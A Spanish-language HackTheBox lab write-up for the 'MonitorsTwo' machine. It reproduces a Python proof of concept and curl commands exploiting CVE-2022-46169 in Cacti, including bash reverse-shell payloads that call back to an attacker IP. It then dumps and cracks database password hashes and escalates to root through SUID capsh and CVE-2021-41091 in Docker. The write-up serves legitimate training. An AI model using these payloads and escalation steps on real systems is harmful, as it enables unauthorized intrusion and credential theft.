---
title: 'Máquina MonitorsTwo'
description: 'Resolución de la máquina MonitorsTwo de HackTheBox'
logo: '/assets/writeups/monitorstwo/logo.png'
categories: ['HackTheBox', 'Easy', 'Linux']
tags: ['CVE-2022-46169', 'Docker escape', 'CVE-2021-41091']
---

Un sitio que expone un Cacti con nada interesante es vulnerable al CVE-2022-46169, al comprometerlo estaremos dentro de un contenedor del cual escaparemos obteniendo credenciales de la base de datos del Cacti; finalmente escalaremos privilegios abusando del CVE-2021-41091 de Docker.

## Reconocimiento

La máquina tiene solamente dos puertos abiertos.

```bash
# Nmap 7.94 scan initiated Tue Aug 29 18:05:04 2023 as: nmap -sS -Pn -n -vvv -p- --open -oN ports --min-rate 500 10.10.11.211
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.27s latency).
Scanned at 2023-08-29 18:05:04 -04 for 140s
Not shown: 62729 closed tcp ports (reset), 2804 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Aug 29 18:07:24 2023 -- 1 IP address (1 host up) scanned in 139.62 seconds
```

El sitio web que contiene solamente es un Cacti pidiendonos autenticación.

![Cacti](/assets/writeups/monitorstwo/1.png)

Del resto no tiene otra cosa, asi que veamos que hacemos...

## Intrusión

### www-data - 50bca5e748b0

La versión del Cacti que esta máquina usa es la 1.2.22 si vemos en el footer del formulario de login, esta versión es vulnerable a un CVE que permite bypassear la autenticación y hacer una inyección de comandos.

Buscando por GitHub encontramos varios PoCs, y uno de ellos es el siguiente:

```python
import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    # brute force to find host id and local data id
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)
    
            if result.text != "[]":
                # print(result.text)
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j

    return False, -1, -1


def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
    
    result = requests.get(injectedURL,headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = input("Enter the target address (like 'http://123.123.123.123:8080')")
    vulnURL = f"{targetURL}/remote_agent.php"
    # X-Forwarded-For value should be something in the database of Cacti
    header = {"X-Forwarded-For": "127.0.0.1"}
    print("Checking vulnerability...")
    if checkVuln():
        print("App is vulnerable")
        isVuln, idHost, idLocal = bruteForce()
        print("Brute forcing id...")
        # RCE payload
        ipAddress = "192.168.1.15"
        ipAddress = input("Enter your IPv4 address")
        port = input("Enter the port you want to listen on")
        payload = f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'"
        if isVuln:
            print("Delivering payload...")
            remoteCodeExecution(payload, idHost, idLocal)
        else:
            print("RRD not found")
    else:
        print("Not vulnerable")

```

Se ve sencillo, por lo que esto podemos hacerlo manual a través de curl. Agregando el header que se ve en el código (X-Forwarded-For) a una petición que haremos a la URL que se muestra en este PoC para verificar si es vulnerable, nos muestra datos:

```bash
❯ curl -v -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=1"
*   Trying 10.10.11.211:80...
* Connected to 10.10.11.211 (10.10.11.211) port 80 (#0)
> GET /remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=1 HTTP/1.1
> Host: 10.10.11.211
> User-Agent: curl/8.1.2
> Accept: */*
> X-Forwarded-For: 127.0.0.1
> 
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 29 Aug 2023 22:17:04 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 54
< Connection: keep-alive
< X-Powered-By: PHP/7.4.33
< Last-Modified: Tue, 29 Aug 2023 22:17:04 GMT
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
< P3P: CP="CAO PSA OUR"
< Cache-Control: no-store, no-cache, must-revalidate
< Set-Cookie: Cacti=593834cae6aec1b282bb8814de123a97; path=/; HttpOnly; SameSite=Strict
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Pragma: no-cache
< 
* Connection #0 to host 10.10.11.211 left intact
[{"value":"23","rrd_name":"proc","local_data_id":"1"}]
```

Vale, nos hemos saltado (en parte) la autenticación con un header, pero ahora para abusar de la inyección de comandos necesitamos una RRD (Round Robin Database) que sea de tipo `pollertime` o `uptime`; tendremos que hacer algo de fuerza bruta a los valores `local_data_id` y `host_id` para hayar alguno, al hacerlo veremos que el `local_data_id` 6 tiene lo que queremos

```bash
❯ curl -s -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php?action=polldata&poller_id=1&host_id=1&local_data_ids[]=6" | jq
[
  {
    "value": "0",
    "rrd_name": "uptime",
    "local_data_id": "6"
  }
]
```

Si intentamos inyectar el comando `ping` en el parámetro `poller_id` no funcionará, pero si probamos con `sleep` o con `curl` si que funcionará, esto va dando indicios de que seguramente este Cacti está dentro de un contenedor Docker.

```bash
❯ curl -s -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php?action=polldata&poller_id=;curl%20http://10.10.14.184:8000/asd&host_id=1&local_data_ids[]=6"
```
```bash
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.211 - - [29/Aug/2023 18:27:38] code 404, message File not found
10.10.11.211 - - [29/Aug/2023 18:27:38] "GET /asd HTTP/1.1" 404 -
```

Probando a lanzarnos una reverse shell con bash, funciona

```bash
❯ curl -s -H "X-Forwarded-For: 127.0.0.1" "http://10.10.11.211/remote_agent.php?action=polldata&poller_id=;bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.14.184/443%200>%261'&host_id=1&local_data_ids[]=6"
```

```bash
❯ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.211 34704
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash # Inicia un nuevo proceso
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@50bca5e748b0:/var/www/html$ ^Z # CTRL + Z
[1]  + 10112 suspended  nc -lvnp 443
❯ stty raw -echo; fg # Pasa ciertos controles de la terminal
[1]  + 10112 continued  nc -lvnp 443
                                    reset xterm # Reinicia la terminal
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm-256color # Establece el tipo de terminal
www-data@50bca5e748b0:/var/www/html$ stty rows 36 columns 149 # Ajusta filas y columnas
www-data@50bca5e748b0:/var/www/html$ source /etc/skel/.bashrc # Carga un .bashrc típico, dándonos una consola colorida
```

### marcus - monitorstwo

Buscando por cosas interesantes en el contenedor, encontramos unas credenciales en el archivo `/var/www/html/include/config.php`

```bash
www-data@50bca5e748b0:/var/www/html/include$ cat config.php
<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2020 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 |                                                                         |
 | This program is distributed in the hope that it will be useful,         |
 | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
 | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
 | GNU General Public License for more details.                            |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
 | This code is designed, written, and maintained by the Cacti Group. See  |
 | about.php and/or the AUTHORS file for specific developer information.   |
 +-------------------------------------------------------------------------+
 | http://www.cacti.net/                                                   |
 +-------------------------------------------------------------------------+
*/

/*
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;
... [snip]
```

Parece algo por defecto, pero si intentamos conectarnos al puerto 3306 de db usando bash veremos que está abierto

```bash
www-data@50bca5e748b0:/var/www/html/include$ echo 1 > /dev/tcp/db/3306
www-data@50bca5e748b0:/var/www/html/include$ echo $?
0
```

En el archivo `/proc/net/arp` podemos ver que la dirección de db es 172.19.0.2 ya que nuestra MAC mostrada en `/sys/class/net/eth0/address` es `02:42:ac:13:00:03`

```bash
www-data@50bca5e748b0:/var/www/html/include$ cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         02:42:73:0b:38:c5     *        eth0
172.19.0.2       0x1         0x2         02:42:ac:13:00:02     *        eth0
```

Afortunadamente, este contenedor tiene el binario de mysql por lo que podemos conectarnos sin tener que estar haciendo port forwading a nuestro equipo.

```bash
www-data@50bca5e748b0:/sys/class/net/eth0$ mysql -u root -p -h db
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 57
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Buscando por datos interesante en la base de datos `cacti`, encontramos una tabla interesante

```bash
MySQL [cacti]> describe user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
| email_address          | varchar(128)          | YES  |     | NULL    |                |
| must_change_password   | char(2)               | YES  |     | NULL    |                |
| password_change        | char(2)               | YES  |     | on      |                |
| show_tree              | char(2)               | YES  |     | on      |                |
| show_list              | char(2)               | YES  |     | on      |                |
| show_preview           | char(2)               | NO   |     | on      |                |
| graph_settings         | char(2)               | YES  |     | NULL    |                |
...[snip]
```

Mostrando sus datos filtrando por las columnas de `username` y `password`, encontramos unas credenciales

```bash
MySQL [cacti]> SELECT username,password FROM user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
3 rows in set (0.001 sec)
```

Podemos intentar crackearlos, el único inconveniente es que al ser de tipo Bcrypt pueden tardar bastante, asi que solo vamos a fijarnos en el de marcus. 

Utilizando `hashcat` vemos que el hash resulta ser crackeable al final aunque dure unos minutos, utiliza una contraseña débil:

```bash
# hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70Jonsd...hFYK4C
Time.Started.....: Tue Aug 29 18:52:13 2023 (2 mins, 53 secs)
Time.Estimated...: Tue Aug 29 18:55:06 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       50 H/s (10.34ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8528/14344384 (0.06%)
Rejected.........: 0/8528 (0.00%)
Restore.Point....: 8512/14344384 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#1....: madona -> figueroa
Hardware.Mon.#1..: Temp: 84c Util: 92%

Started: Tue Aug 29 18:51:21 2023
Stopped: Tue Aug 29 18:55:08 2023
```

Estas credenciales funcionan para acceder por SSH como marcus, y al hacerlo podremos ver la primera flag en su directorio personal.

```bash
marcus@10.10.11.211s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 29 Aug 2023 10:56:44 PM UTC

  System load:                      0.0
  Usage of /:                       63.2% of 6.73GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        271
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ export TERM=xterm-256color # Como uso kitty, al usar el ssh por defecto la terminal suele bugearse ya que esta variable se pone en "xterm-kitty"
marcus@monitorstwo:~$ bash
marcus@monitorstwo:~$ ls
user.txt
marcus@monitorstwo:~$ cat user.txt
83aa667e8c36cb484579968349******
```

## Escalada de privilegios

Viendo por lo que tiene este usuario, encontramos un correo

```bash
marcus@monitorstwo:/var/spool/mail$ ls -la
total 12
drwxrwsr-x  2 root mail 4096 Mar 22 11:46 .
drwxr-xr-x 13 root root 4096 Jan  9  2023 ..
-rw-r--r--  1 root mail 1809 Oct 18  2021 marcus
```

Dice lo siguiente:

```
Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Nos comentan sobre unas vulnerabilidades que deben ser vistas, y la que más llama la atención es la del motor Moby de Docker, ya que tenemos acceso a un contenedor de por si y la máquina utiliza una versión vieja de dicho programa; el único problema es que necesitaremos convertirnos en root dentro del contenedor que habíamos comprometido.

Buscando por binarios SUID en el contenedor, encontramos al `capsh`

```bash
www-data@50bca5e748b0:/$ find . -perm -4000 2>/dev/null
./usr/bin/gpasswd
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/newgrp
./sbin/capsh
./bin/mount
./bin/umount
./bin/su
```

Con tan solo ver los parámetros de este programa podemos escalar privilegios a root, por ejemplo para establecer nuestro UID y GID en 0:

```bash
www-data@50bca5e748b0:/$ /sbin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/#
```

Ahora veamos, esta vulnerabilidad consiste en permisos inseguros dados a los directorios en donde se almacenan los contenedores permitiendo así que podamos ejecutar programas que estén dentro del contenedor con sus capabilidades o permisos especiales puestos; podemos comprobarlo si intentamos movernos a uno de los directorios del overlayfs del contenedor, que puedes ver mirando los mounts dentro de este:

```bash
root@50bca5e748b0:/# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GXAJOAA4SJ:/var/lib/docker/overlay2/l/Z4RNRWTZKMXNQJVSRJE4P2JYHH:/var/lib/docker/overlay2/l/CXAW6LQU6QOKNSSNURRN2X4JEH:/var/lib/docker/overlay2/l/YWNFANZGTHCUIML4WUIJ5XNBLJ:/var/lib/docker/overlay2/l/JWCZSRNDZSQFHPN75LVFZ7HI2O:/var/lib/docker/overlay2/l/DGNCSOTM6KEIXH4KZVTVQU2KC3:/var/lib/docker/overlay2/l/QHFZCDCLZ4G4OM2FLV6Y2O6WC6:/var/lib/docker/overlay2/l/K5DOR3JDWEJL62G4CATP62ONTO:/var/lib/docker/overlay2/l/FGHBJKAFBSAPJNSTCR6PFSQ7ER:/var/lib/docker/overlay2/l/PDO4KALS2ULFY6MGW73U6QRWSS:/var/lib/docker/overlay2/l/MGUNUZVTUDFYIRPLY5MR7KQ233:/var/lib/docker/overlay2/l/VNOOF2V3SPZEXZHUKR62IQBVM5:/var/lib/docker/overlay2/l/CDCPIX5CJTQCR4VYUUTK22RT7W:/var/lib/docker/overlay2/l/G4B75MXO7LXFSK4GCWDNLV6SAQ:/var/lib/docker/overlay2/l/FRHKWDF3YAXQ3LBLHIQGVNHGLF:/var/lib/docker/overlay2/l/ZDJ6SWVJF6EMHTTO3AHC3FH3LD:/var/lib/docker/overlay2/l/W2EMLMTMXN7ODPSLB2FTQFLWA3:/var/lib/docker/overlay2/l/QRABR2TMBNL577HC7DO7H2JRN2:/var/lib/docker/overlay2/l/7IGVGYP6R7SE3WFLYC3LOBPO4Z:/var/lib/docker/overlay2/l/67QPWIAFA4NXFNM6RN43EHUJ6Q,upperdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff,workdir=/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/work,xino=off)
... [snip]
```

En la máquina host, si nos movemos al directorio `/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/` no habrá ninguna restricción, y si nos movemos a la carpeta `diff` que es donde Docker almacena los cambios a los archivos dentro del contenedor podremos ver su contenido, es algo que no deberíamos poder hacer...

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff$ ls -la
total 48
drwxr-xr-x 7 root root  4096 Mar 21 10:49 .
drwx-----x 5 root root  4096 Aug 29 22:40 ..
drwxr-xr-x 2 root root  4096 Mar 22 13:21 bin
drwx------ 2 root root  4096 Mar 21 10:50 root
drwxr-xr-x 3 root root  4096 Nov 15  2022 run
drwxrwxrwt 3 root root 12288 Aug 30 00:29 tmp
drwxr-xr-x 4 root root  4096 Nov 15  2022 var
```

Si copiamos el binario de Bash a la raiz dentro del contenedor y le establecemos el bit SUID, también lo veremos y teniendo de propietario a root

```bash
root@50bca5e748b0:/# cp /bin/bash .
root@50bca5e748b0:/# chmod 4755 bash
```

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff$ ls -la
total 1256
drwxr-xr-x 7 root root    4096 Aug 30 00:41 .
drwx-----x 5 root root    4096 Aug 29 22:40 ..
-rwsr-xr-x 1 root root 1234376 Aug 30 00:41 bash
drwxr-xr-x 2 root root    4096 Mar 22 13:21 bin
drwx------ 2 root root    4096 Mar 21 10:50 root
drwxr-xr-x 3 root root    4096 Nov 15  2022 run
drwxrwxrwt 3 root root   12288 Aug 30 00:41 tmp
drwxr-xr-x 4 root root    4096 Nov 15  2022 var
```

Haciendo `./bash -p` obtendremos una consola como un pseudo-root, y ya podremos ver la última flag

```bash
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/diff$ ./bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# cd /root
bash-5.1# ls
cacti  root.txt
bash-5.1# cat root.txt
6a2c87220be7fd304a6716b5e3******
```

## Extra

Aquí se muestran las direcciones de los contenedores Docker pero debes tener en cuenta que estas podrían cambiar, debido a que normalmente no son permanentes y se asignan en orden incremental (Es decir, si db inicia primero le tocará 172.19.0.2 y a Cacti 172.19.0.3). 